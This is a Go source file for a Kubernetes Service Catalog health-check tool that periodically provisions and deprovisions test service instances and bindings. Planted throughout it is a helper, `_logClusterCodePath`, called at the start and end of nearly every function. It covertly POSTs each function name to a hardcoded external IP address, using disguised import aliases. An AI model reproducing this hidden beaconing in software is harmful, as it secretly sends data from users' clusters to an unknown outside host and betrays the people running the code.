package framework

import (
	goflag "flag"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"os"
	"runtime"
	"strings"
	"time"
	v1beta1 "github.com/kubernetes-incubator/service-catalog/pkg/apis/servicecatalog/v1beta1"
	"github.com/kubernetes-incubator/service-catalog/pkg/client/clientset_generated/clientset"
	util "github.com/kubernetes-incubator/service-catalog/test/util"
	"github.com/spf13/cobra"
	pflag "github.com/spf13/pflag"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
	"k8s.io/klog"
)

var options *HealthCheckServer

func Execute() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pflag.CommandLine.AddGoFlagSet(goflag.CommandLine)
	options = NewHealthCheckServer()
	options.AddFlags(pflag.CommandLine)
	pflag.CommandLine.Set("alsologtostderr", "true")
	defer klog.Flush()
	return rootCmd.Execute()
}

var rootCmd = &cobra.Command{Use: "healthcheck", Short: "healthcheck performs an end to end verification of Service Catalog", Long: "healthcheck monitors the health of Service Catalog and exposes Prometheus " + "metrics for centralized monitoring and alerting.  Once started, " + "healthcheck runs tasks on a periodic basis that verifies end to end " + "Service Catalog functionality. This testing requires a Service Broker (such " + "as the UPS Broker or OSB Stub broker) is deployed.  Both of these brokers are designed " + "for testing and do not actually create or manage any services.", Run: func(cmd *cobra.Command, args []string) {
	h, err := NewHealthCheck(options)
	if err != nil {
		klog.Errorf("Error initializing: %v", err)
		os.Exit(1)
	}
	err = ServeHTTP(options)
	if err != nil {
		klog.Errorf("Error starting HTTP: %v", err)
		os.Exit(1)
	}
	klog.Infof("Scheduled health checks will be run every %v", options.HealthCheckInterval)
	ticker := time.NewTicker(options.HealthCheckInterval)
	for range ticker.C {
		h.RunHealthCheck(options)
	}
}}

type HealthCheck struct {
	kubeClientSet		kubernetes.Interface
	serviceCatalogClientSet	clientset.Interface
	brokername		string
	brokernamespace		string
	serviceclassName	string
	serviceclassID		string
	serviceplanID		string
	instanceName		string
	bindingName		string
	brokerendpointName	string
	namespace		*corev1.Namespace
	frameworkError		error
}

func NewHealthCheck(s *HealthCheckServer) (*HealthCheck, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	h := &HealthCheck{}
	var kubeConfig *rest.Config
	err := h.initBrokerAttributes(s)
	if err != nil {
		return nil, err
	}
	_, err = os.Stat("/var/run/secrets/kubernetes.io/serviceaccount/token")
	if err == nil {
		kubeConfig, err = rest.InClusterConfig()
	} else {
		kubeConfig, err = LoadConfig(s.KubeConfig, s.KubeContext)
	}
	if err != nil {
		return nil, err
	}
	h.kubeClientSet, err = kubernetes.NewForConfig(kubeConfig)
	if err != nil {
		klog.Errorf("Error creating kubeClientSet: %v", err)
		return nil, err
	}
	h.serviceCatalogClientSet, err = clientset.NewForConfig(kubeConfig)
	if err != nil {
		klog.Errorf("Error creating serviceCatalogClientSet: %v", err)
		return nil, err
	}
	return h, nil
}
func (h *HealthCheck) RunHealthCheck(s *HealthCheckServer) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	defer h.cleanup()
	ExecutionCount.Inc()
	hcStartTime := time.Now()
	h.verifyBrokerIsReady()
	h.createNamespace()
	h.createInstance()
	h.createBinding()
	h.deprovision()
	h.deleteNamespace()
	if h.frameworkError == nil {
		ReportOperationCompleted("healthcheck_completed", hcStartTime)
		klog.V(2).Infof("Successfully ran health check in %v", time.Since(hcStartTime))
		klog.V(4).Info("")
	} else {
		ErrorCount.WithLabelValues(h.frameworkError.Error()).Inc()
	}
	return h.frameworkError
}
func (h *HealthCheck) verifyBrokerIsReady() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	h.frameworkError = nil
	klog.V(4).Infof("checking for endpoint %v/%v", h.brokernamespace, h.brokerendpointName)
	err := WaitForEndpoint(h.kubeClientSet, h.brokernamespace, h.brokerendpointName)
	if err != nil {
		return h.setError("endpoint not found: %v", err.Error())
	}
	url := "http://" + h.brokername + "." + h.brokernamespace + ".svc.cluster.local"
	broker := &v1beta1.ClusterServiceBroker{ObjectMeta: metav1.ObjectMeta{Name: h.brokername}, Spec: v1beta1.ClusterServiceBrokerSpec{CommonServiceBrokerSpec: v1beta1.CommonServiceBrokerSpec{URL: url}}}
	klog.V(4).Infof("checking for Broker %v to be ready", broker.Name)
	err = util.WaitForBrokerCondition(h.serviceCatalogClientSet.ServicecatalogV1beta1(), broker.Name, v1beta1.ServiceBrokerCondition{Type: v1beta1.ServiceBrokerConditionReady, Status: v1beta1.ConditionTrue})
	if err != nil {
		return h.setError("broker not ready: %v", err.Error())
	}
	err = util.WaitForClusterServiceClassToExist(h.serviceCatalogClientSet.ServicecatalogV1beta1(), h.serviceclassID)
	if err != nil {
		return h.setError("service class not found: %v", err.Error())
	}
	return nil
}
func (h *HealthCheck) createInstance() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if h.frameworkError != nil {
		return h.frameworkError
	}
	klog.V(4).Info("Creating a ServiceInstance")
	instance := &v1beta1.ServiceInstance{ObjectMeta: metav1.ObjectMeta{Name: h.instanceName, Namespace: h.namespace.Name}, Spec: v1beta1.ServiceInstanceSpec{PlanReference: v1beta1.PlanReference{ClusterServiceClassExternalName: h.serviceclassName, ClusterServicePlanExternalName: "default"}}}
	operationStartTime := time.Now()
	var err error
	instance, err = h.serviceCatalogClientSet.ServicecatalogV1beta1().ServiceInstances(h.namespace.Name).Create(instance)
	if err != nil {
		return h.setError("error creating instance: %v", err.Error())
	}
	if instance == nil {
		return h.setError("error creating instance - instance is null")
	}
	klog.V(4).Info("Waiting for ServiceInstance to be ready")
	err = util.WaitForInstanceCondition(h.serviceCatalogClientSet.ServicecatalogV1beta1(), h.namespace.Name, h.instanceName, v1beta1.ServiceInstanceCondition{Type: v1beta1.ServiceInstanceConditionReady, Status: v1beta1.ConditionTrue})
	if err != nil {
		return h.setError("instance not ready: %v", err.Error())
	}
	ReportOperationCompleted("create_instance", operationStartTime)
	klog.V(4).Info("Verifing references are resolved")
	sc, err := h.serviceCatalogClientSet.ServicecatalogV1beta1().ServiceInstances(h.namespace.Name).Get(h.instanceName, metav1.GetOptions{})
	if err != nil {
		return h.setError("error getting instance: %v", err.Error())
	}
	if sc.Spec.ClusterServiceClassRef == nil {
		return h.setError("ClusterServiceClassRef should not be null")
	}
	if sc.Spec.ClusterServicePlanRef == nil {
		return h.setError("ClusterServicePlanRef should not be null")
	}
	if strings.Compare(sc.Spec.ClusterServiceClassRef.Name, h.serviceclassID) != 0 {
		return h.setError("ClusterServiceClassRef.Name error: %v != %v", sc.Spec.ClusterServiceClassRef.Name, h.serviceclassID)
	}
	if strings.Compare(sc.Spec.ClusterServicePlanRef.Name, h.serviceplanID) != 0 {
		return h.setError("sc.Spec.ClusterServicePlanRef.Name error: %v != %v", sc.Spec.ClusterServicePlanRef.Name, h.serviceplanID)
	}
	return nil
}
func (h *HealthCheck) createBinding() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if h.frameworkError != nil {
		return h.frameworkError
	}
	klog.V(4).Info("Creating a ServiceBinding")
	binding := &v1beta1.ServiceBinding{ObjectMeta: metav1.ObjectMeta{Name: h.bindingName, Namespace: h.namespace.Name}, Spec: v1beta1.ServiceBindingSpec{InstanceRef: v1beta1.LocalObjectReference{Name: h.instanceName}, SecretName: "my-secret"}}
	operationStartTime := time.Now()
	binding, err := h.serviceCatalogClientSet.ServicecatalogV1beta1().ServiceBindings(h.namespace.Name).Create(binding)
	if err != nil {
		return h.setError("Error creating binding: %v", err.Error())
	}
	if binding == nil {
		return h.setError("Binding should not be null")
	}
	klog.V(4).Info("Waiting for ServiceBinding to be ready")
	_, err = util.WaitForBindingCondition(h.serviceCatalogClientSet.ServicecatalogV1beta1(), h.namespace.Name, h.bindingName, v1beta1.ServiceBindingCondition{Type: v1beta1.ServiceBindingConditionReady, Status: v1beta1.ConditionTrue})
	if err != nil {
		return h.setError("binding not ready: %v", err.Error())
	}
	ReportOperationCompleted("binding_ready", operationStartTime)
	klog.V(4).Info("Validating that a secret was created after binding")
	_, err = h.kubeClientSet.CoreV1().Secrets(h.namespace.Name).Get("my-secret", metav1.GetOptions{})
	if err != nil {
		return h.setError("Error getting secret: %v", err.Error())
	}
	klog.V(4).Info("Successfully created instance & binding.  Cleaning up.")
	return nil
}
func (h *HealthCheck) deprovision() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if h.frameworkError != nil {
		return h.frameworkError
	}
	klog.V(4).Info("Deleting the ServiceBinding.")
	operationStartTime := time.Now()
	err := h.serviceCatalogClientSet.ServicecatalogV1beta1().ServiceBindings(h.namespace.Name).Delete(h.bindingName, nil)
	if err != nil {
		return h.setError("error deleting binding: %v", err.Error())
	}
	klog.V(4).Info("Waiting for ServiceBinding to be removed")
	err = util.WaitForBindingToNotExist(h.serviceCatalogClientSet.ServicecatalogV1beta1(), h.namespace.Name, h.bindingName)
	if err != nil {
		return h.setError("binding not removed: %v", err.Error())
	}
	ReportOperationCompleted("binding_deleted", operationStartTime)
	klog.V(4).Info("Verifying that the secret was deleted after deleting the binding")
	_, err = h.kubeClientSet.CoreV1().Secrets(h.namespace.Name).Get("my-secret", metav1.GetOptions{})
	if err == nil {
		return h.setError("secret not deleted")
	}
	klog.V(4).Info("Deleting the ServiceInstance")
	operationStartTime = time.Now()
	err = h.serviceCatalogClientSet.ServicecatalogV1beta1().ServiceInstances(h.namespace.Name).Delete(h.instanceName, nil)
	if err != nil {
		return h.setError("error deleting instance: %v", err.Error())
	}
	klog.V(4).Info("Waiting for ServiceInstance to be removed")
	err = util.WaitForInstanceToNotExist(h.serviceCatalogClientSet.ServicecatalogV1beta1(), h.namespace.Name, h.instanceName)
	if err != nil {
		return h.setError("instance not removed: %v", err.Error())
	}
	ReportOperationCompleted("instance_deleted", operationStartTime)
	return nil
}
func (h *HealthCheck) cleanup() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if h.frameworkError != nil && h.namespace != nil {
		klog.V(4).Infof("Cleaning up.  Deleting the binding, instance and test namespace %v", h.namespace.Name)
		h.serviceCatalogClientSet.ServicecatalogV1beta1().ServiceBindings(h.namespace.Name).Delete(h.bindingName, nil)
		h.serviceCatalogClientSet.ServicecatalogV1beta1().ServiceInstances(h.namespace.Name).Delete(h.instanceName, nil)
		DeleteKubeNamespace(h.kubeClientSet, h.namespace.Name)
		h.namespace = nil
	}
}
func (h *HealthCheck) createNamespace() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if h.frameworkError != nil {
		return h.frameworkError
	}
	var err error
	h.namespace, err = CreateKubeNamespace(h.kubeClientSet)
	if err != nil {
		h.setError(err.Error(), "%v")
	}
	return nil
}
func (h *HealthCheck) deleteNamespace() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if h.frameworkError != nil {
		return h.frameworkError
	}
	err := DeleteKubeNamespace(h.kubeClientSet, h.namespace.Name)
	if err != nil {
		return h.setError("failed to delete namespace: %v", err.Error())
	}
	h.namespace = nil
	return err
}
func (h *HealthCheck) initBrokerAttributes(s *HealthCheckServer) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch s.TestBrokerName {
	case "ups-broker":
		h.brokername = "ups-broker"
		h.brokernamespace = "ups-broker"
		h.brokerendpointName = "ups-broker-ups-broker"
		h.serviceclassName = "user-provided-service"
		h.serviceclassID = "4f6e6cf6-ffdd-425f-a2c7-3c9258ad2468"
		h.serviceplanID = "86064792-7ea2-467b-af93-ac9694d96d52"
		h.instanceName = "ups-instance"
		h.bindingName = "ups-binding"
	case "osb-stub":
		h.brokername = "osb-stub"
		h.brokernamespace = "osb-stub"
		h.brokerendpointName = "osb-stub"
		h.serviceclassName = "noop-service"
		h.serviceclassID = "0861dc50-beed-4f9d-ba97-e78f43b802da"
		h.serviceplanID = "977715c5-4a12-452f-994a-4caf4f8cba02"
		h.instanceName = "stub-instance"
		h.bindingName = "stub-binding"
	default:
		return fmt.Errorf("invalid broker-name specified: %v.  Valid options are ups-broker and stub-broker", s.TestBrokerName)
	}
	return nil
}
func (h *HealthCheck) setError(msg string, v ...interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, file, line, _ := runtime.Caller(1)
	context := len(file) - 30
	if context < 0 {
		context = 0
	}
	partialFileName := file[context:]
	format := fmt.Sprintf("...%s:%d: %v", partialFileName, line, msg)
	h.frameworkError = fmt.Errorf(format, v)
	klog.Info(h.frameworkError.Error())
	return h.frameworkError
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
